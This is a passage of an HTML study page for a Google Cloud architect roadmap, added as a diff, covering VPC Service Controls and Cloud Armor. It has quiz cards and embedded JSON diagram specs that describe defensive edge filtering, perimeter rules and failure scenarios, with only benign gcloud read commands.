+            <button class="quiz-option" type="button" onclick="checkQuiz(this, false, 'IAM conditions restrict when or where roles apply, but do not prevent a compromised token from writing to an external bucket if IAM permits it.')">D) Apply IAM Conditions restricting role grants to business hours.</button>
+          </ul>
+          <div class="quiz-explanation"></div>
+        </div>
+        
+      <div class="quiz-card"><span class="quiz-badge">Band: Recall</span><p><strong>What is the core resource boundary described by this topic?</strong></p><button class="quiz-option" type="button" onclick="checkQuiz(this,true,'Start with the documented scope, not the product name.')">Show answer</button><div class="quiz-explanation"></div></div><div class="quiz-card"><span class="quiz-badge">Band: PCA Scenario</span><p><strong>A requirement changes from regional to global. What must be revisited first?</strong></p><button class="quiz-option" type="button" onclick="checkQuiz(this,true,'Revisit scope, consistency, failure domains, and cost.')">Show answer</button><div class="quiz-explanation"></div></div><div class="quiz-card"><span class="quiz-badge">Band: Staff Review</span><p><strong>Which hidden dependency would you instrument before approving this design?</strong></p><button class="quiz-option" type="button" onclick="checkQuiz(this,true,'Review IAM, DNS, quotas, Google APIs, metadata access, and ownership.')">Show answer</button><div class="quiz-explanation"></div></div><div class="quiz-card"><span class="quiz-badge">Band: Practical Task</span><p><strong>Write one rejected alternative and the evidence that would change your decision.</strong></p><button class="quiz-option" type="button" onclick="checkQuiz(this,true,'Record assumptions, alternatives, evidence, and rollback.')">Show answer</button><div class="quiz-explanation"></div></div>
+    </section>
+
+    <!-- Footer 2: Further Reading -->
+    <section class="topic-section" id="reading">
+      <h2 class="section-title"><span class="section-number">6</span> Further Reading & Authoritative Google Cloud Docs</h2>
+      <ul><li><a href='https://cloud.google.com/vpc-service-controls/docs/overview' target='_blank'>VPC Service Controls Overview</a></li><li><a href='https://cloud.google.com/armor/docs' target='_blank'>Google Cloud Armor Overview</a></li></ul>
+    </section>
+    <!-- Topic Pagination Footer -->
+    <nav class="topic-pagination" aria-label="Topic Pagination">
+      <!-- Previous Topic -->
+      <a href="topic-034.html" class="pagination-card prev">
+        <div class="pagination-direction">← PREVIOUS TOPIC</div>
+        <div class="pagination-topic-meta">Phase 5 — Security & Compliance • [5.1]</div>
+        <div class="pagination-title">034: Advanced IAM, Federation & Zero Trust</div>
+        <div class="pagination-shortcut">Shortcut: <kbd>P</kbd> or <kbd>←</kbd></div>
+      </a>
+
+      <!-- Roadmap Overview -->
+      <a href="../index.html" class="pagination-card index" title="Return to All Topics Index">
+        <div class="pagination-direction">ROADMAP OVERVIEW</div>
+        <div class="pagination-topic-meta">All 60 Topics • 7 Phases</div>
+        <div class="pagination-title">Architecture Explorer</div>
+        <div class="pagination-shortcut">Key: <kbd>I</kbd></div>
+      </a>
+
+      <!-- Next Topic -->
+      <a href="topic-036.html" class="pagination-card next">
+        <div class="pagination-direction">NEXT TOPIC →</div>
+        <div class="pagination-topic-meta">Phase 5 — Security & Compliance • [5.3]</div>
+        <div class="pagination-title">036: Data Protection: Cloud KMS & DLP</div>
+        <div class="pagination-shortcut">Shortcut: <kbd>N</kbd> or <kbd>→</kbd></div>
+      </a>
+    </nav>
+
+
+  </main>
+
+  <footer style="text-align: center; padding: 24px; color: var(--text-dim); font-size: 11px; border-top: 1px solid var(--panel-border);">
+    Google Cloud Architect Roadmap • Minimalist Systems Design • 100% Static & Offline Compatible
+  </footer>
+
+  <!-- Embedded Data & Scripts (Zero Fetch / 100% Offline & File:// Compatible) -->
+  <script id="spec-d1-data" type="application/json">
+{
+  "id": "topic-035-d1",
+  "title": "Network Security: VPC-SC & Cloud Armor \u2014 Scope & Architecture Map",
+  "topic_no": "035",
+  "roadmap_id": "5.2",
+  "kind": "map",
+  "purpose": "Visualizes Multi-Layer Network Security: Cloud Armor WAF and DDoS mitigation at the edge, coupled with VPC Service Controls (VPC-SC) perimeters protecting confidential BigQuery and Cloud Storage assets.",
+  "routing_rationale": "Defense-in-depth requires filtering malicious inbound traffic at the Google edge (Cloud Armor) while simultaneously preventing authorized compute instances from exfiltrating sensitive data to unauthorized external endpoints (VPC-SC).",
+  "groups": [
+    {
+      "id": "g-armor-edge",
+      "label": "Google Edge: Cloud Armor WAF",
+      "type": "external",
+      "scope": "global",
+      "x": 30,
+      "y": 30,
+      "width": 240,
+      "height": 360
+    },
+    {
+      "id": "g-vpc-dmz",
+      "label": "DMZ VPC: Frontend Microservices",
+      "type": "vpc",
+      "scope": "regional",
+      "x": 300,
+      "y": 30,
+      "width": 310,
+      "height": 360
+    },
+    {
+      "id": "g-vpcsc-perimeter",
+      "label": "VPC-SC Perimeter: Core Data Vault",
+      "type": "project",
+      "scope": "global",
+      "x": 640,
+      "y": 30,
+      "width": 290,
+      "height": 360
+    }
+  ],
+  "nodes": [
+    {
+      "id": "armor-waf",
+      "label": "Cloud Armor Enterprise",
+      "product": "OWASP Top 10 + DDoS Defense",
+      "group": "g-armor-edge",
+      "plane": "data",
+      "x": 140,
+      "y": 140,
+      "detail": "Blocks SQLi, XSS, and L7 HTTP floods; evaluates client IP reputation scores."
+    },
+    {
+      "id": "rate-limiter",
+      "label": "Adaptive Rate Limiting",
+      "product": "Max 500 req/min per IP",
+      "group": "g-armor-edge",
+      "plane": "data",
+      "x": 140,
+      "y": 280,
+      "detail": "Throttles brute-force login attempts and automated credential stuffing bots."
+    },
+    {
+      "id": "frontend-gke",
+      "label": "GKE Microservice Fleet",
+      "product": "Internal Workloads (Private Subnet)",
+      "group": "g-vpc-dmz",
+      "plane": "data",
+      "x": 440,
+      "y": 200,
+      "detail": "Processes client requests; calls backend storage via Private Service Connect."
+    },
+    {
+      "id": "vpcsc-guard",
+      "label": "VPC Service Perimeter",
+      "product": "Access Context Manager Rules",
+      "group": "g-vpcsc-perimeter",
+      "plane": "control",
+      "x": 780,
+      "y": 140,
+      "detail": "Strict boundary enclosing BigQuery and GCS; blocks data transfers outside perimeter."
+    },
+    {
+      "id": "secure-bq",
+      "label": "Confidential BigQuery Data",
+      "product": "Protected Analytic Dataset",
+      "group": "g-vpcsc-perimeter",
+      "plane": "data",
+      "x": 780,
+      "y": 280,
+      "detail": "Customer PII data accessible only from authorized IPs and VPC perimeters."
+    }
+  ],
+  "edges": [
+    {
+      "id": "e1",
+      "from": "armor-waf",
+      "to": "frontend-gke",
+      "label": "1. Forward Sanitized Traffic",
+      "plane": "data"
+    },
+    {
+      "id": "e2",
+      "from": "rate-limiter",
+      "to": "frontend-gke",
+      "label": "2. Allow Valid Rate Ingress",
+      "plane": "data"
+    },
+    {
+      "id": "e3",
+      "from": "frontend-gke",
+      "to": "vpcsc-guard",
+      "label": "3. Cross-Perimeter PSC Query",
+      "plane": "data"
+    },
+    {
+      "id": "e4",
+      "from": "vpcsc-guard",
+      "to": "secure-bq",
+      "label": "4. Verify Ingress Policy & Query",
+      "plane": "control"
+    }
+  ],
+  "steps": [
+    {
+      "n": 1,
+      "title": "Edge Threat Filtering",
+      "edges": [
+        "e1",
+        "e2"
+      ],
+      "action": "Cloud Armor inspects HTTP request, blocks SQL injection attempt, and permits clean traffic.",
+      "why_traversal": "Eliminates attack payloads before they reach application containers.",
+      "protocol": "WAF Rule Engine",
+      "plane": "Data Plane"
+    },
+    {
+      "n": 2,
+      "title": "Perimeter Verification & Data Access",
+      "edges": [
+        "e3",
+        "e4"
+      ],
+      "action": "VPC-SC validates that request originates from authorized GKE VPC and permits BigQuery read.",
+      "why_traversal": "Strictly isolates sensitive data from unauthorized exfiltration routes.",
+      "protocol": "VPC Service Controls Enforcement",
+      "plane": "Control Plane"
+    }
+  ],
+  "scenarios": [
+    {
+      "id": "data-exfil-attempt",
+      "label": "Insider Data Exfiltration Thwarted",
+      "changes": {
+        "failedNodes": [
+          "vpcsc-guard"
+        ],
+        "failedEdges": [
+          "e4"
+        ]
+      },
+      "root_cause": "Compromised GKE pod attempted to copy BigQuery data to an external personal GCS bucket.",
+      "diverted_path": "VPC-SC blocks outbound transfer: VPC_SERVICE_CONTROLS_VIOLATION.",
+      "blast_radius": "Zero data leaked; security alert dispatched to SCC in real time.",
+      "recovery": "Investigate compromised pod, rotate pod service account, and quarantine node."
+    }
+  ]
+}
+  </script>
+  <script id="spec-d2-data" type="application/json">
+{
+  "id": "topic-035-d2",
+  "title": "Network Security: VPC-SC & Cloud Armor \u2014 Request & Control Flow",
+  "topic_no": "035",
+  "roadmap_id": "5.2",
+  "kind": "flow",
+  "purpose": "Traces Multi-Perimeter Ingress/Egress Communication: how GKE in Project A securely accesses BigQuery in Project B using explicit VPC Service Controls Ingress & Egress rules.",
+  "routing_rationale": "VPC Service Controls allows granular perimeter bridging using cryptographically validated identity and network constraints without merging entire projects into a single flat network.",
+  "groups": [
+    {
+      "id": "g-perim-a",
+      "label": "Perimeter Alpha: App Services (Project A)",
+      "type": "project",
+      "scope": "regional",
+      "x": 30,
+      "y": 30,
+      "width": 240,
+      "height": 360
+    },
+    {
+      "id": "g-egress-rule",
+      "label": "Access Context Manager Ingress/Egress Rules",
+      "type": "organization",
+      "scope": "organization",
+      "x": 300,
+      "y": 30,
+      "width": 310,
+      "height": 360
+    },
+    {
+      "id": "g-perim-b",
+      "label": "Perimeter Beta: Data Lakehouse (Project B)",
+      "type": "project",
+      "scope": "global",
+      "x": 640,
+      "y": 30,
+      "width": 290,
+      "height": 360
+    }
+  ],
+  "nodes": [
+    {
+      "id": "app-sa-caller",
+      "label": "App Service Account",
+      "product": "app-runner@proj-a.iam.gserviceaccount.com",
+      "group": "g-perim-a",
+      "plane": "data",
+      "x": 140,
+      "y": 200,
+      "detail": "GKE pod executing transactional analytics query across project boundaries."
+    },
+    {
+      "id": "egress-policy",
+      "label": "Perimeter A Egress Rule",
+      "product": "Allows egress to Proj B for BigQuery",
+      "group": "g-egress-rule",
+      "plane": "control",
+      "x": 440,
+      "y": 140,
+      "detail": "Specifies from identity: app-runner, to service: bigquery.googleapis.com."
+    },
+    {
+      "id": "ingress-policy",
+      "label": "Perimeter B Ingress Rule",
+      "product": "Allows ingress from Perimeter A",
+      "group": "g-egress-rule",
+      "plane": "control",
+      "x": 440,
+      "y": 280,
+      "detail": "Validates caller identity and source project before admitting request."
+    },
+    {
+      "id": "bq-lakehouse",
+      "label": "Project B BigQuery Dataset",
+      "product": "orders_fact Table",
+      "group": "g-perim-b",
+      "plane": "data",
+      "x": 780,
+      "y": 200,
+      "detail": "Executes query and streams partitioned results back to Project A."
+    }
+  ],
+  "edges": [
+    {
+      "id": "e1",
+      "from": "app-sa-caller",
+      "to": "egress-policy",
+      "label": "1. Initiate Cross-Project Call",
+      "plane": "data"
+    },
+    {
+      "id": "e2",
+      "from": "egress-policy",
+      "to": "ingress-policy",
+      "label": "2. Match Egress Rule & Bridge",
+      "plane": "control"
+    },
+    {
+      "id": "e3",
+      "from": "ingress-policy",
+      "to": "bq-lakehouse",
+      "label": "3. Match Ingress Rule & Execute",
+      "plane": "data"
+    }
+  ],
+  "steps": [
+    {
+      "n": 1,
+      "title": "Egress Policy Validation",
+      "edges": [
+        "e1",
+        "e2"
+      ],
+      "action": "Perimeter A checks egress policy: caller is authorized to contact BigQuery in Project B.",
+      "why_traversal": "Prevents unauthorized outbound calls while allowing approved workflows.",
+      "protocol": "VPC-SC Egress Rule",
+      "plane": "Control Plane"
+    },
+    {
+      "n": 2,
+      "title": "Ingress Admittance",
+      "edges": [
+        "e3"
+      ],
+      "action": "Perimeter B confirms caller identity matches ingress whitelist and executes query.",
+      "why_traversal": "Secures data perimeter from arbitrary external callers.",
+      "protocol": "VPC-SC Ingress Rule",
+      "plane": "Data Plane"
+    }
+  ],
+  "scenarios": [
+    {
+      "id": "unauthorized-method-block",
+      "label": "Unauthorized Storage API Method Blocked",
+      "changes": {
+        "failedNodes": [
+          "ingress-policy"
+        ],
+        "failedEdges": [
+          "e3"
+        ]
+      },
+      "root_cause": "Caller attempted to call storage.buckets.delete instead of permitted bigquery.tables.getData.",
+      "diverted_path": "VPC-SC evaluates method constraint and rejects deletion attempt.",
+      "blast_radius": "Zero data loss.",
+      "recovery": "Restrict caller permissions strictly to read-only analytical operations."
+    }
+  ]
+}
+  </script>
+  <script id="spec-d3-data" type="application/json">
+{
+  "id": "topic-035-d3",
+  "title": "Network Security: VPC-SC & Cloud Armor \u2014 Failure Injection & Auto-Healing",
+  "topic_no": "035",
+  "roadmap_id": "5.2",
+  "kind": "failure",
+  "purpose": "Simulates Cloud Armor Adaptive Protection: automated machine learning detects a Layer 7 HTTP flood attack, generates a custom WAF signature, and blocks attack traffic.",
+  "routing_rationale": "Adaptive Protection analyzes traffic baselines using machine learning, automatically producing targeted rules to neutralize novel zero-day application attacks.",
+  "groups": [
+    {
+      "id": "g-ddos-flood",
+      "label": "Distributed Botnet (100,000 IPs)",
+      "type": "external",
+      "scope": "external",
+      "x": 30,
+      "y": 30,
+      "width": 420,
+      "height": 360
+    },
+    {
+      "id": "g-armor-defense",
+      "label": "Cloud Armor Adaptive Protection Engine",
+      "type": "project",
+      "scope": "global",
+      "x": 480,
+      "y": 30,
+      "width": 440,
+      "height": 360
+    }
+  ],
+  "nodes": [
+    {
+      "id": "botnet-flood",
+      "label": "L7 HTTP Flood (1M QPS)",
+      "product": "Automated Headless Browsers",
+      "group": "g-ddos-flood",
+      "plane": "data",
+      "x": 220,
+      "y": 140,
+      "detail": "Botnet sends 1,000,000 requests/sec with rotating User-Agent strings."
+    },
+    {
+      "id": "ml-detector",
+      "label": "Adaptive Threat Analyzer",
+      "product": "Real-time Traffic Anomaly ML",
+      "group": "g-ddos-flood",
+      "plane": "control",
+      "x": 220,
+      "y": 280,
+      "detail": "Identifies common attack fingerprint in HTTP headers within 45 seconds."
+    },
+    {
+      "id": "auto-waf-rule",
+      "label": "Dynamic WAF Rule Generated",
+      "product": "Rule: deny if header matches signature",
+      "group": "g-armor-defense",
+      "plane": "control",
+      "x": 700,
+      "y": 140,
+      "detail": "Generates rule with confidence score 0.98; deploys to edge proxy in 2 seconds."
+    },
+    {
+      "id": "edge-drop",
+      "label": "Edge Traffic Drop (HTTP 429)",
+      "product": "Google Anycast PoP Edge",
+      "group": "g-armor-defense",
+      "plane": "data",
+      "x": 700,
+      "y": 280,
+      "detail": "Drops 99.8% of botnet traffic at edge PoPs worldwide; backend origin CPU drops to 20%."
+    }
+  ],
+  "edges": [
+    {
+      "id": "e1",
+      "from": "botnet-flood",
+      "to": "ml-detector",
+      "label": "1. Analyze Influx Fingerprint",
+      "plane": "control"
+    },
+    {
+      "id": "e2",
+      "from": "ml-detector",
+      "to": "auto-waf-rule",
+      "label": "2. Synthesize Signature & Rule",
+      "plane": "control"
+    },
+    {
+      "id": "e3",
+      "from": "auto-waf-rule",
+      "to": "edge-drop",
+      "label": "3. Enforce Rule at Global Edge",
+      "plane": "data"
+    }
+  ],
+  "steps": [
+    {
+      "n": 1,
+      "title": "Anomaly Identification",
+      "edges": [
+        "e1",
+        "e2"
+      ],
+      "action": "Adaptive Protection ML correlates requests across 100k IPs and extracts distinguishing header.",
+      "why_traversal": "Identifies complex distributed attacks that evade simple rate limiters.",
+      "protocol": "Machine Learning Anomaly Engine",
+      "plane": "Control Plane"
+    },
+    {
+      "n": 2,
+      "title": "Automated Edge Mitigation",
+      "edges": [
+        "e3"
+      ],
+      "action": "Cloud Armor deploys targeted rule to all edge points of presence, dropping flood packets.",
+      "why_traversal": "Protects backend web servers from exhaustion and eliminates origin egress charges.",
+      "protocol": "Cloud Armor Rule Deployment",
+      "plane": "Data Plane"
+    }
+  ],
+  "scenarios": [
+    {
+      "id": "rule-false-positive-risk",
+      "label": "Overly Broad Signature Drops Legitimate Users",
+      "changes": {
+        "failedNodes": [
+          "auto-waf-rule"
+        ],
+        "failedEdges": [
+          "e3"
+        ]
+      },
+      "root_cause": "Signature used common header shared by legitimate mobile application users.",
+      "diverted_path": "Legitimate customers receive HTTP 429 errors.",
+      "blast_radius": "Customer checkout disruption.",
+      "recovery": "Deploy Adaptive Protection rules in preview mode first and refine signature with multi-attribute matching."
+    }
+  ]
+}
+  </script>
+<script id="spec-d4-data" type="application/json">
+{
+  "id": "topic-035-d4",
+  "title": "Network Security: VPC Service Controls, Cloud Armor & Firewalls \u2014 D4",
+  "topic_no": "035",
+  "roadmap_id": "5.2",
+  "kind": "security",
+  "purpose": "Shows identities, trust boundaries, policy checks, and audit evidence.",
+  "routing_rationale": "Defense-in-depth requires filtering malicious inbound traffic at the Google edge (Cloud Armor) while simultaneously preventing authorized compute instances from exfiltrating sensitive data to unauthorized external endpoints (VPC-SC).",
+  "groups": [
+    {
+      "id": "g-armor-edge",
+      "label": "Google Edge: Cloud Armor WAF",
+      "type": "external",
+      "scope": "global",
+      "x": 30,
+      "y": 30,
+      "width": 240,
+      "height": 360
+    },
+    {
+      "id": "g-vpc-dmz",
+      "label": "DMZ VPC: Frontend Microservices",
+      "type": "vpc",
+      "scope": "regional",
+      "x": 300,
+      "y": 30,
+      "width": 310,
+      "height": 360
+    },
+    {
+      "id": "g-vpcsc-perimeter",
+      "label": "VPC-SC Perimeter: Core Data Vault",
+      "type": "project",
+      "scope": "global",
+      "x": 640,
+      "y": 30,
+      "width": 290,
+      "height": 360
+    }
+  ],
+  "nodes": [
+    {
+      "id": "armor-waf",
+      "label": "Cloud Armor Enterprise",
+      "product": "OWASP Top 10 + DDoS Defense",
+      "group": "g-armor-edge",
+      "plane": "data",
+      "x": 140,
+      "y": 140,
+      "detail": "Blocks SQLi, XSS, and L7 HTTP floods; evaluates client IP reputation scores."
+    },
+    {
+      "id": "rate-limiter",
+      "label": "Adaptive Rate Limiting",
+      "product": "Max 500 req/min per IP",
+      "group": "g-armor-edge",
+      "plane": "data",
+      "x": 140,
+      "y": 280,
+      "detail": "Throttles brute-force login attempts and automated credential stuffing bots."
+    },
+    {
+      "id": "frontend-gke",
+      "label": "GKE Microservice Fleet",
+      "product": "Internal Workloads (Private Subnet)",
+      "group": "g-vpc-dmz",
+      "plane": "data",
+      "x": 440,
+      "y": 200,
+      "detail": "Processes client requests; calls backend storage via Private Service Connect."
+    },
+    {
+      "id": "vpcsc-guard",
+      "label": "VPC Service Perimeter",
+      "product": "Access Context Manager Rules",
+      "group": "g-vpcsc-perimeter",
+      "plane": "control",
+      "x": 780,
+      "y": 140,
+      "detail": "Strict boundary enclosing BigQuery and GCS; blocks data transfers outside perimeter."
+    },
+    {
+      "id": "secure-bq",
+      "label": "Confidential BigQuery Data",
+      "product": "Protected Analytic Dataset",
+      "group": "g-vpcsc-perimeter",
+      "plane": "data",
+      "x": 780,
+      "y": 280,
+      "detail": "Customer PII data accessible only from authorized IPs and VPC perimeters."
+    }
+  ],
+  "edges": [
+    {
+      "id": "e1",
+      "from": "armor-waf",
+      "to": "frontend-gke",
+      "label": "1. Forward Sanitized Traffic",
+      "plane": "data"
+    },
+    {
+      "id": "e2",
+      "from": "rate-limiter",
+      "to": "frontend-gke",
+      "label": "2. Allow Valid Rate Ingress",
+      "plane": "data"
+    },
+    {
+      "id": "e3",
+      "from": "frontend-gke",
+      "to": "vpcsc-guard",
+      "label": "3. Cross-Perimeter PSC Query",
+      "plane": "data"
+    },
+    {
+      "id": "e4",
+      "from": "vpcsc-guard",
+      "to": "secure-bq",
+      "label": "4. Verify Ingress Policy & Query",
+      "plane": "control"
+    }
+  ],
+  "steps": [
+    {
+      "n": 1,
+      "title": "Edge Threat Filtering",
+      "edges": [
+        "e1",
+        "e2"
+      ],
+      "action": "Cloud Armor inspects HTTP request, blocks SQL injection attempt, and permits clean traffic.",
+      "why_traversal": "Eliminates attack payloads before they reach application containers.",
+      "protocol": "WAF Rule Engine",
+      "plane": "Data Plane",
+      "check": {
+        "metrics": "request_count and error_count",
+        "logs": "severity>=ERROR",
+        "commands": "gcloud services list --enabled"
+      }
+    },
+    {
+      "n": 2,
+      "title": "Perimeter Verification & Data Access",
+      "edges": [
+        "e3",
+        "e4"
+      ],
+      "action": "VPC-SC validates that request originates from authorized GKE VPC and permits BigQuery read.",
+      "why_traversal": "Strictly isolates sensitive data from unauthorized exfiltration routes.",
+      "protocol": "VPC Service Controls Enforcement",
+      "plane": "Control Plane",
+      "check": {
+        "metrics": "request_count and error_count",
+        "logs": "severity>=ERROR",
+        "commands": "gcloud services list --enabled"
+      }
+    }
+  ],
+  "scenarios": [
+    {
+      "id": "data-exfil-attempt",
+      "label": "Insider Data Exfiltration Thwarted",
+      "changes": {
+        "failedNodes": [
+          "vpcsc-guard"
+        ],
+        "failedEdges": [
+          "e4"
+        ]
+      },
+      "root_cause": "Compromised GKE pod attempted to copy BigQuery data to an external personal GCS bucket.",
+      "diverted_path": "VPC-SC blocks outbound transfer: VPC_SERVICE_CONTROLS_VIOLATION.",
+      "blast_radius": "Zero data leaked; security alert dispatched to SCC in real time.",
+      "recovery": "Investigate compromised pod, rotate pod service account, and quarantine node."
+    },
+    {
+      "id": "quota-exhausted",
+      "label": "Quota exhausted",
+      "changes": {
+        "failedNodes": [
+          "armor-waf"
+        ],
+        "failedEdges": [
+          "e1"
+        ]
+      },
+      "root_cause": "A project or regional quota reaches its allocation limit.",
+      "diverted_path": "Requests surface elevated latency, errors, or denied actions.",
+      "blast_radius": "Consumers of the affected resource or dependency.",
+      "recovery": "Reduce load, restore the dependency, and add a tested prevention.",
+      "check": {
+        "metric": "error_count > 0",
+        "command": "gcloud logging read 'severity>=ERROR' --limit=20"
+      }
+    },
+    {
+      "id": "dependency-unavailable",
+      "label": "Dependency unavailable",
+      "changes": {
+        "failedNodes": [
+          "armor-waf"
+        ],
+        "failedEdges": [
+          "e1"
+        ]
+      },
+      "root_cause": "A required API or downstream dependency is unavailable.",
+      "diverted_path": "Requests surface elevated latency, errors, or denied actions.",
+      "blast_radius": "Consumers of the affected resource or dependency.",
+      "recovery": "Reduce load, restore the dependency, and add a tested prevention.",
+      "check": {
+        "metric": "error_count > 0",
+        "command": "gcloud logging read 'severity>=ERROR' --limit=20"
+      }
+    }
+  ],
+  "summary": "Shows identities, trust boundaries, policy checks, and audit evidence."
+}
+</script>
+<script id="spec-d5-data" type="application/json">
+{
+  "id": "topic-035-d5",
+  "title": "Network Security: VPC Service Controls, Cloud Armor & Firewalls \u2014 D5",
+  "topic_no": "035",
+  "roadmap_id": "5.2",
+  "kind": "scale-cost",
+  "purpose": "Shows what changes at 10x load and where operational cost moves.",
+  "routing_rationale": "Defense-in-depth requires filtering malicious inbound traffic at the Google edge (Cloud Armor) while simultaneously preventing authorized compute instances from exfiltrating sensitive data to unauthorized external endpoints (VPC-SC).",
+  "groups": [
+    {
+      "id": "g-armor-edge",
+      "label": "Google Edge: Cloud Armor WAF",
+      "type": "external",
+      "scope": "global",
+      "x": 30,
+      "y": 30,
+      "width": 240,
+      "height": 360
+    },
+    {
+      "id": "g-vpc-dmz",
+      "label": "DMZ VPC: Frontend Microservices",
+      "type": "vpc",
+      "scope": "regional",
+      "x": 300,
+      "y": 30,
+      "width": 310,
+      "height": 360
+    },
+    {
+      "id": "g-vpcsc-perimeter",
+      "label": "VPC-SC Perimeter: Core Data Vault",
+      "type": "project",
+      "scope": "global",
+      "x": 640,
+      "y": 30,
+      "width": 290,
+      "height": 360
+    }
+  ],
+  "nodes": [
+    {
+      "id": "armor-waf",
+      "label": "Cloud Armor Enterprise",
+      "product": "OWASP Top 10 + DDoS Defense",
+      "group": "g-armor-edge",
+      "plane": "data",
+      "x": 140,
+      "y": 140,
+      "detail": "Blocks SQLi, XSS, and L7 HTTP floods; evaluates client IP reputation scores."
+    },
+    {
+      "id": "rate-limiter",
+      "label": "Adaptive Rate Limiting",
+      "product": "Max 500 req/min per IP",
+      "group": "g-armor-edge",
+      "plane": "data",
+      "x": 140,
+      "y": 280,
+      "detail": "Throttles brute-force login attempts and automated credential stuffing bots."
+    },
+    {
+      "id": "frontend-gke",
+      "label": "GKE Microservice Fleet",
+      "product": "Internal Workloads (Private Subnet)",
+      "group": "g-vpc-dmz",
+      "plane": "data",
+      "x": 440,
+      "y": 200,
+      "detail": "Processes client requests; calls backend storage via Private Service Connect."
+    },
+    {
+      "id": "vpcsc-guard",
+      "label": "VPC Service Perimeter",
+      "product": "Access Context Manager Rules",
+      "group": "g-vpcsc-perimeter",
+      "plane": "control",
+      "x": 780,
+      "y": 140,
+      "detail": "Strict boundary enclosing BigQuery and GCS; blocks data transfers outside perimeter."
+    },
+    {
+      "id": "secure-bq",
+      "label": "Confidential BigQuery Data",
+      "product": "Protected Analytic Dataset",
+      "group": "g-vpcsc-perimeter",
+      "plane": "data",
+      "x": 780,
+      "y": 280,
+      "detail": "Customer PII data accessible only from authorized IPs and VPC perimeters."
+    }
+  ],
+  "edges": [
+    {
+      "id": "e1",
+      "from": "armor-waf",
+      "to": "frontend-gke",
+      "label": "1. Forward Sanitized Traffic",
+      "plane": "data"
+    },
+    {
+      "id": "e2",
+      "from": "rate-limiter",
+      "to": "frontend-gke",
+      "label": "2. Allow Valid Rate Ingress",
+      "plane": "data"
+    },
+    {
+      "id": "e3",
+      "from": "frontend-gke",
+      "to": "vpcsc-guard",
+      "label": "3. Cross-Perimeter PSC Query",
+      "plane": "data"
+    },
+    {
+      "id": "e4",
+      "from": "vpcsc-guard",
+      "to": "secure-bq",
+      "label": "4. Verify Ingress Policy & Query",
+      "plane": "control"
+    }
+  ],
+  "steps": [
+    {
+      "n": 1,
+      "title": "Edge Threat Filtering",
+      "edges": [
+        "e1",
+        "e2"
+      ],
+      "action": "Cloud Armor inspects HTTP request, blocks SQL injection attempt, and permits clean traffic.",
+      "why_traversal": "Eliminates attack payloads before they reach application containers.",
+      "protocol": "WAF Rule Engine",
+      "plane": "Data Plane",
+      "check": {
+        "metrics": "request_count and error_count",
+        "logs": "severity>=ERROR",
+        "commands": "gcloud services list --enabled"
+      }
+    },
+    {
+      "n": 2,
+      "title": "Perimeter Verification & Data Access",
+      "edges": [
+        "e3",
+        "e4"
+      ],
+      "action": "VPC-SC validates that request originates from authorized GKE VPC and permits BigQuery read.",
+      "why_traversal": "Strictly isolates sensitive data from unauthorized exfiltration routes.",
+      "protocol": "VPC Service Controls Enforcement",
+      "plane": "Control Plane",
+      "check": {
+        "metrics": "request_count and error_count",
+        "logs": "severity>=ERROR",
+        "commands": "gcloud services list --enabled"
+      }
+    }
+  ],
+  "scenarios": [
+    {
+      "id": "data-exfil-attempt",
+      "label": "Insider Data Exfiltration Thwarted",
+      "changes": {
+        "failedNodes": [
+          "vpcsc-guard"
+        ],
+        "failedEdges": [
+          "e4"
+        ]
+      },
+      "root_cause": "Compromised GKE pod attempted to copy BigQuery data to an external personal GCS bucket.",
+      "diverted_path": "VPC-SC blocks outbound transfer: VPC_SERVICE_CONTROLS_VIOLATION.",
+      "blast_radius": "Zero data leaked; security alert dispatched to SCC in real time.",
+      "recovery": "Investigate compromised pod, rotate pod service account, and quarantine node."
+    },
+    {
+      "id": "quota-exhausted",
+      "label": "Quota exhausted",
+      "changes": {
+        "failedNodes": [
+          "armor-waf"
+        ],
+        "failedEdges": [
+          "e1"
+        ]
+      },
+      "root_cause": "A project or regional quota reaches its allocation limit.",
+      "diverted_path": "Requests surface elevated latency, errors, or denied actions.",
+      "blast_radius": "Consumers of the affected resource or dependency.",
+      "recovery": "Reduce load, restore the dependency, and add a tested prevention.",
+      "check": {
+        "metric": "error_count > 0",
+        "command": "gcloud logging read 'severity>=ERROR' --limit=20"
+      }
+    },
+    {
+      "id": "dependency-unavailable",
+      "label": "Dependency unavailable",
+      "changes": {
+        "failedNodes": [
+          "armor-waf"
+        ],
+        "failedEdges": [
+          "e1"
+        ]
+      },
+      "root_cause": "A required API or downstream dependency is unavailable.",
+      "diverted_path": "Requests surface elevated latency, errors, or denied actions.",
+      "blast_radius": "Consumers of the affected resource or dependency.",
+      "recovery": "Reduce load, restore the dependency, and add a tested prevention.",
+      "check": {
+        "metric": "error_count > 0",
+        "command": "gcloud logging read 'severity>=ERROR' --limit=20"
+      }
+    }
+  ],
+  "summary": "Shows what changes at 10x load and where operational cost moves."
+}
+</script>
+<script id="spec-d6-data" type="application/json">
+{
+  "id": "topic-035-d6",
+  "title": "Network Security: VPC Service Controls, Cloud Armor & Firewalls \u2014 D6",
+  "topic_no": "035",
+  "roadmap_id": "5.2",
+  "kind": "internals",
+  "purpose": "Shows the documented internals needed to predict behavior; undocumented details are observed behavior and may change.",
+  "routing_rationale": "Defense-in-depth requires filtering malicious inbound traffic at the Google edge (Cloud Armor) while simultaneously preventing authorized compute instances from exfiltrating sensitive data to unauthorized external endpoints (VPC-SC).",
+  "groups": [
+    {
+      "id": "g-armor-edge",
+      "label": "Google Edge: Cloud Armor WAF",
+      "type": "external",
+      "scope": "global",
+      "x": 30,
+      "y": 30,
+      "width": 240,
+      "height": 360
+    },
+    {
+      "id": "g-vpc-dmz",
+      "label": "DMZ VPC: Frontend Microservices",
+      "type": "vpc",
+      "scope": "regional",
+      "x": 300,
+      "y": 30,
+      "width": 310,
+      "height": 360
+    },
+    {
+      "id": "g-vpcsc-perimeter",
+      "label": "VPC-SC Perimeter: Core Data Vault",
+      "type": "project",
+      "scope": "global",
+      "x": 640,
+      "y": 30,
+      "width": 290,
+      "height": 360
+    }
+  ],
+  "nodes": [
+    {
+      "id": "armor-waf",
+      "label": "Cloud Armor Enterprise",
+      "product": "OWASP Top 10 + DDoS Defense",
+      "group": "g-armor-edge",
+      "plane": "data",
+      "x": 140,
+      "y": 140,
+      "detail": "Blocks SQLi, XSS, and L7 HTTP floods; evaluates client IP reputation scores."
+    },
+    {
+      "id": "rate-limiter",
+      "label": "Adaptive Rate Limiting",
+      "product": "Max 500 req/min per IP",
+      "group": "g-armor-edge",
+      "plane": "data",
+      "x": 140,
+      "y": 280,
+      "detail": "Throttles brute-force login attempts and automated credential stuffing bots."
+    },
+    {
+      "id": "frontend-gke",
+      "label": "GKE Microservice Fleet",
